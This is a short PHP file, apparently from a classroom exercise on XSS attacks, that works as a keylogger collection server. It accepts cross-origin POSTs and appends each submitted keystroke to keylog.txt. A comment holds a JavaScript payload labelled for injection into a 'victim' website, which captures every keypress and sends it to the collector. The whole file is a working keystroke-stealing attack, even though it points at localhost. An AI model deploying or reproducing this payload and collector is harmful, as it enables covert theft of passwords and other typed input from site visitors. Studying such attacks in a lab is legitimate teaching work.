<?php
    // Registro de la tecla presionada (acepta cualquier tecla)
    header('Access-Control-Allow-Origin: *');

    if (isset($_POST['key'])) {
        $logfile = fopen("keylog.txt", "a+");
        fwrite($logfile, $_POST['key']);
        fclose($logfile);
    }

    /* Código a inyectar en la web víctima
    <script>document.onkeypress = function(evt) {evt = evt || window.event;const key = String.fromCharCode(evt.charCode);if (key) {const param = encodeURI(key);fetch('http://localhost/programasphp_repos/9.Seguridad_Ataque_XSS/web_hacker/index.php', {method: 'POST',headers: {'Content-type': 'application/x-www-form-urlencoded'},body: 'key=' + param});}};</script>
    */
?>